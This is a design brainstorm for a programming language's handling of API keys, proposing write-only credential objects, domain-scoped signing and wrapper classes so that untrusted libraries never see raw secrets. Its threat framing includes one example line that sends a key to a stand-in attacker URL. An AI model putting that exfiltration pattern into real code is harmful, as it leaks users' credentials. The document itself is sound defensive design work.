# Idea: API-key security

~~~vibecode
{"vibecode": {
	"doc": "ideas_api_security",
	"role": "design brainstorm for handling API keys (and other sensitive credentials) in Caspian without falling into the standard-in-other-languages trap of handing them to whatever library needs to make the API call. Motivating scenario: a downloaded library needs to make authenticated requests to some service on the user's behalf. Passing the raw API key to the library gives the library complete authority to do anything with that key — exfiltrate it, use it for unrelated calls, leak it via URL side channels through default-granted %fetch. Caspian's security posture calls for something better. This page collects ideas.",
	"key_concepts": ["api_key_handling", "capability_scoping",
		"delegate_dont_hand_over", "credential_containment"],
	"status": "brainstorm — problem framed; Miko has ideas he'll add",
	"context": "raised 2026-07-25 during the engine-granted-capabilities design work. Default-granting %fetch to all roles (for library-loading ergonomics) means a downloaded library holding an API key could exfiltrate it via `%fetch('https://attacker/log?k=' + $key)`. Standard workaround in other languages is 'don't hand secrets to untrusted code' — but Caspian's whole point is being MORE secure than that answer allows."
}}
~~~

## The problem

Programs constantly need to make authenticated calls to third-party services — AWS, Stripe, GitHub, an internal microservice, whatever. The standard pattern in every mainstream language:

1. Program has an API key (from env, config file, secret manager).
2. Program imports / requires a library that wraps the third-party API.
3. Program hands the API key to the library.
4. Library uses the key to sign requests.

The library now holds the key. It could:

- Use the key to make the calls the developer intended (the happy path).
- Use the key to make **additional** calls the developer didn't intend, to the same service.
- Exfiltrate the key entirely by embedding it in an outbound URL, a log line, a telemetry ping, or any other channel it has.
- Store the key persistently and use it later.

Every language accepts this because "you have to trust your dependencies." Caspian is supposed to be more secure — that answer isn't good enough.

Under Caspian's current default-grant posture, the exfil path is especially easy: [`%fetch` is default-granted to all roles](https://puck.uno/ideas/globals-via-fetch) for library-loading ergonomics, and `%fetch` accepts any URL. A downloaded library that holds an API key can construct a URL containing the key and fetch it — the request lands at the attacker's server before any Caspian security check runs.

## How API authentication is usually implemented

Third-party APIs use a handful of standard authentication schemes. Each one leans on some kind of secret — the API key, an OAuth token, a signing key, a TLS client cert — that the caller has to present with each request. The differences matter for the security-model conversation because they change *what the library needs to hold* and therefore *what an untrusted library could leak*.

### Bearer tokens (API keys, OAuth tokens)

The most common shape. The caller has a token — a long random string — and sends it in an HTTP header on every request:

~~~
Authorization: Bearer sk_live_abc123def456...
~~~

Server checks the token against its records; if it matches an authorized identity, the request goes through. Examples: GitHub personal access tokens, Stripe secret keys, most SaaS "API keys," most OAuth 2.0 access tokens.

**What the library holds:** the raw bearer token as a string. Sending it means putting it in the `Authorization` header of an outgoing HTTP request.

**Exfil surface:** trivial. The token IS a string; anything the library does with strings (log, embed in a URL, POST to another endpoint) leaks it directly.

### HMAC-signed requests (AWS SigV4 and similar)

The caller has a shared secret. Instead of sending the secret with each request, the caller uses it to compute an HMAC signature over the request contents (method, URL, headers, body, timestamp) and sends the signature in an `Authorization` header. The server, holding the same secret, recomputes the signature and verifies.

~~~
Authorization: AWS4-HMAC-SHA256 Credential=AKIA...,
	Signature=abcdef1234...
~~~

Examples: AWS SigV4, most cloud providers' signing schemes, some webhook systems.

**What the library holds:** the shared secret (the "secret access key" in AWS parlance) plus the identifier for that key (the "access key ID"). To sign a request, the library needs the raw secret.

**Exfil surface:** still trivial. The secret is a string in memory; the library can exfil it the same way as a bearer token. The fact that the signature goes on the wire (not the secret) protects against passive network eavesdropping, not against a malicious library that holds the secret.

### JWT-based auth (client-generated)

The caller has a private key (or a shared secret). It generates a JWT — a JSON payload signed with the key — and sends the JWT as a bearer token. The server verifies the signature using the corresponding public key (or the shared secret).

**What the library holds:** the private key (asymmetric) or shared secret (symmetric).

**Exfil surface:** same as HMAC — the signing key can be extracted if the library holds it.

### OAuth 2.0 flows (authorization code, refresh tokens)

Layered on top of bearer tokens. The initial "token" the library sees is a **short-lived access token**, and there's a **refresh token** that can be exchanged for new access tokens when the current one expires. The refresh token is typically longer-lived and more sensitive.

**What the library holds:** the access token (and, in some setups, the refresh token). Both are strings.

**Exfil surface:** access token is short-lived so its exfil is time-bounded, but refresh token is high-value — an attacker who exfils it can mint access tokens indefinitely until it's revoked.

### Mutual TLS (mTLS) — client certificate authentication

The caller's identity is proven by a TLS client certificate. During the TLS handshake, the client presents a cert; the server validates it against a trusted CA (or an explicit allow-list). No shared secret is sent per-request; the private key that pairs with the cert is used only during the handshake.

Examples: enterprise service-to-service, many financial-services APIs, Kubernetes API server, some cloud provider control planes.

**What the library holds:** the private key file (or an in-memory key). Or, more usefully, a reference to a TLS context / connection factory the runtime already set up.

**Exfil surface:** narrower. The private key is not a value the library sends over the wire — it's used during a TLS handshake to prove possession. If the library has a reference to a pre-configured TLS context (not the raw key), it can *make requests* through that context but can't *extract the key material*. This is the shape closest to what capability-scoped auth would look like in Caspian.

### HTTP Basic auth

Username + password, base64-encoded, sent in the `Authorization: Basic` header:

~~~
Authorization: Basic dXNlcjpwYXNz
~~~

Old-school but still around, especially for internal tools and simple APIs.

**What the library holds:** the username and password.

**Exfil surface:** same as bearer tokens. Base64 isn't encryption.

### The common pattern across all of these

Except for mTLS, every scheme in wide use requires the library to hold a **raw secret value** it can extract, log, or send to any URL. The library's authority to make legitimate calls is inseparable from its authority to exfil the credential. In every mainstream language, that's just accepted — the standard advice is "don't include untrusted libraries," which pushes the problem elsewhere without solving it.

The mTLS pattern is the interesting outlier. There, the library can be handed a *thing that lets it make requests* (a TLS context) without the raw key material. If it goes rogue, the blast radius is bounded to "requests it can make while the runtime holds the key" rather than "the key itself, forever, everywhere."

## What good would look like

A downloaded library that needs to make authenticated calls to a third-party service should be able to do exactly that — **without ever seeing the raw API key**. The library gets the ability to *sign requests* or *make requests* to a specific service, but not the credential itself. If the library goes rogue or leaks, the blast radius is bounded to what it could actually do with its narrowed capability, not "arbitrary use of the key + full exfiltration."

Roughly: **delegate, don't hand over.** The user code holds the key; the library gets a capability that lets it exercise the key without extracting it.

## The design: `$auth` + a service class

Two objects, distinct responsibilities:

- **`$auth`** — the credential-and-scope primitive. Holds the secret (write-only) and the allowed-domains list (readable). Constructed from `core:auth` — engine-provided, not a downloaded library.
- **A service-specific class** (e.g., `caspian.uno/service/stripe`) — the API wrapper that knows how to talk to that specific service. Takes an `$auth` in its constructor and uses it internally to sign requests. Never re-exposes it.

Sketch:

~~~caspian
# User code — construct an $auth object, configure it, hand it to the service class.
$auth = %('core:auth')
$auth.secret = {scheme: 'bearer', token: 'sk_live_abc123...'}
$auth.domains <+ 'https://api.stripe.com'

$stripe = %('caspian.uno/service/stripe').new(auth: $auth)

# Library code — receives $stripe, not $auth, and certainly not the raw secret.
&third_party_charge_processor $stripe, $card_data
~~~

The library gets `$stripe`. It can invoke `$stripe.charges.create(...)`, `$stripe.customers.list(...)`, etc. Each method internally uses `$auth` to sign the outbound request. The library never touches `$auth` and has no path to the credential.

## Why `core:auth` and not a downloadable library

Auth is mission-critical security. If `$auth` were `caspian.uno/auth.casp` — a downloaded library — every fetch of that URL is a supply-chain surface: registry compromise, MITM'd cache-miss, someone taking over the URL and publishing a rogue update.

Putting auth on `core:` means:

- **Trust anchor.** The implementation ships with the engine; every Caspian process has the same well-audited `core:auth` class. No fetch step, no third-party risk.
- **Cognitive posture.** Developers seeing `core:auth` read it as "engine primitive," not "one of many random libraries." That's the right posture for the class that holds credentials.
- **Fits the `core:` criterion.** `core:` is for pure / side-effect-free capabilities. `$auth` is pure — constructing one is a pure allocation; using one to sign a request is pure computation on inputs. The actual network I/O happens later in whatever service class uses `$auth`, and that's what routes through `%engine.http_client` (or similar) with its own capability gate.

## The two visible surfaces on `$auth`

`$auth` exposes two things:

- **`$auth.secret` — write-only.** Assign to it to install the credential; attempting to READ it back is either impossible (the slot has no getter) or raises. Same shape as Caspian's [Password class](https://puck.uno/requirements/secure-memory/passkey/) — you can put a value in and use it via other operations, but the value never comes back out as a plain string. Even a library that somehow got a direct reference to `$auth` (bypassing the service wrapper) cannot extract the secret. Structural rules on the value:
	- **Must be a hash.** Assigning a bare string, number, or anything else raises.
	- **Strictly flat.** Keys are strings; values are scalars only (string, number, boolean, `null`). Nested hashes and arrays raise at assign time with a specific error (`\`$auth.secret\` values must be scalars; got \`hash\` at key \`token\``). No silent flattening, no coercion.
	- **`scheme:` is required.** Every valid hash has a `scheme:` field naming the auth scheme (`'bearer'`, `'basic'`, `'sigv4'`, `'oauth2'`, `'mtls'`, `'custom_header'`, `'query_param'`, ...). Assigning a hash without `scheme:` raises. The scheme tells `$auth` which signer to use; without it, `$auth` doesn't know how to interpret the rest of the fields.
	- **Scheme determines the required and permitted keys.** Bearer needs `token:`; SigV4 needs `access_key_id:` + `secret_access_key:` (+ optional `region:`, `service:`); Basic needs `username:` + `password:`; mTLS needs `cert_pem:` + `private_key_pem:` (as PEM-encoded strings — cert chains bundle into one PEM). Extra fields the scheme doesn't recognize raise. See [Open design questions § auth scheme handling](#open-design-questions) for the class-vs-subclass shape.
- **`$auth.domains` — readable.** The set of URLs (or URL patterns — TBD) that `$auth` is authorized to hit. The library CAN inspect this — it's not sensitive, and it's useful capability-shape information ("what am I allowed to reach?"). Any request `$auth` signs is checked against this set at signing time; requests to URLs outside the set raise.

Real-world scheme shapes, all fitting the flat-hash rule:

| Scheme | Example hash |
|---|---|
| Bearer | `{scheme: 'bearer', token: '...'}` |
| Basic | `{scheme: 'basic', username: '...', password: '...'}` |
| AWS SigV4 | `{scheme: 'sigv4', access_key_id: '...', secret_access_key: '...', region: '...', service: '...'}` |
| Custom header | `{scheme: 'custom_header', header_name: 'X-API-Key', value: '...'}` |
| OAuth 2.0 | `{scheme: 'oauth2', access_token: '...', refresh_token: '...'}` |
| JWT (HMAC) | `{scheme: 'jwt_hs256', secret: '...'}` |
| mTLS | `{scheme: 'mtls', cert_pem: '...', private_key_pem: '...'}` |
| Query-string key | `{scheme: 'query_param', param_name: 'api_key', value: '...'}` |

Edge case: "multiple credentials for the same call" (e.g., a JWT signer plus a transport-layer client cert) doesn't fit one flat hash. That case is two `$auth` objects; the service class takes both as constructor arguments if it needs them. One `$auth` = one credential shape stays a clean rule.

The split is deliberate: **the credential is hidden; the capability-shape is visible.** A library holding a reference to `$auth` (whether directly or via the service wrapper's internal reference) can reason about what it's authorized to do, but cannot exfil what authorizes it.

## The service class

The service-specific class (`caspian.uno/service/stripe`, `caspian.uno/service/aws`, etc.) does two things:

1. **Takes an `$auth` in its constructor.** Stores it in the object's bucket (private state, not re-exposed).
2. **Exposes a method surface that mirrors the third-party API's endpoints.** Each method internally uses the held `$auth` to sign the request and dispatch it — through the engine's HTTP layer.

The library holding the service object can invoke its methods but has no accessor for the underlying `$auth`. Two layers of containment:

- Layer 1 (encapsulation): the library doesn't reach `$auth` — the service class holds it privately.
- Layer 2 (write-only): even if the library somehow got a reference to `$auth`, the credential itself is unreadable.

## Auto-injection at the transport layer

The service class doesn't compose an HTTP request in Caspian code with the credential baked in and then pass it to `%fetch` — that would give a rogue library a chance to inspect the composed request. Instead, the engine has a "signed-request" surface: the service class hands the engine `(URL, method, body, auth)`, and the engine composes the request, injects the credential via the auth's signer, and sends. Nothing in Caspian-visible memory ever holds the fully-composed request with the credential baked in. Same idea as mTLS handling in most runtimes — the credential lives at the transport layer, not in application memory.

## Narrowed jails on the service class

Even the service class can be over-broad. If a library only needs to *read* customers, the user can hand it a jailed version of the service object that exposes only the read methods:

~~~caspian
$stripe_readonly = $stripe.jail(:customers_read, :charges_read)
&reporting_library $stripe_readonly
~~~

Same [jail wrapper spec](https://puck.uno/requirements/roles/object-access/) that governs other narrowed-access patterns. The library can only invoke methods the jail allows; even for methods it CAN invoke, the outbound URL is still checked against `$auth.domains`.

## Open design questions

1. **Auth scheme handling — class vs subclasses.** The secret hash carries a required `scheme:` field, so `$auth` always knows which signer to use. The remaining question is whether `core:auth` is a single class that dispatches internally on `scheme:`, or whether the `core:` namespace exposes subclasses (`core:auth/bearer`, `core:auth/sigv4`, `core:auth/mtls`) so the type carries the scheme too. Single class: one URL to remember, hash-driven dispatch. Subclasses: type-safer, more discoverable, but N URLs to publish and maintain. Either is compatible with the flat-hash rule.
2. **`.domains` shape.** Just origins (scheme + host)? URL prefixes (scheme + host + path)? Full URL patterns? Real APIs need at least prefix matching — AWS is `https://<region>.<service>.amazonaws.com`, GitHub has `https://api.github.com/repos/*` vs `https://api.github.com/user/*` where a user might want to restrict a library to one subtree. Likely candidates: RFC 6570 URI templates, glob-style `*`, or a Caspian-native scheme.
3. **The `<+` operator.** Reading it as "add-to-collection" (like Ruby's `<<`). Is that a general Caspian operator, or specific to this pattern? Worth pinning down since it'll show up in a lot of `.domains` code.
4. **Who writes the service classes?** For every third-party API, someone has to publish a `caspian.uno/service/X` class. Real ecosystem work. Miko-published for the top-N services (Stripe, AWS, Github, GCP, ...); community-published beyond that.
5. **What about custom / private APIs?** A team's internal microservice doesn't have a canonical class. Do users write their own service wrappers per-service, or is there a generic "signed-fetch" primitive (built on `$auth`) that covers 80% of the custom cases without needing a full class per service?
6. **Credential rotation.** If the underlying key rotates, `$auth.secret = <new>` on the existing `$auth` object automatically means every service class holding a reference sees the new credential on its next call. Confirmed shape; worth spec'ing explicitly so nobody caches the old value.
7. **Introspection beyond `.domains`.** Can a library ask `$auth` `"what auth scheme are you?"` (the scheme is not the secret; useful for error messages and retry logic). Preferred: yes, scheme is visible. Anything more (e.g., `.access_key_id` on SigV4, which isn't the secret but IS the identity) — TBD per scheme.
8. **mTLS.** mTLS credentials are runtime-managed keys, not strings. Does the `$auth` pattern extend cleanly (private key lives inside `$auth`, TLS handshake happens at transport time, library never sees the key)? Almost certainly yes — mTLS is closest to the pattern we're generalizing to begin with.
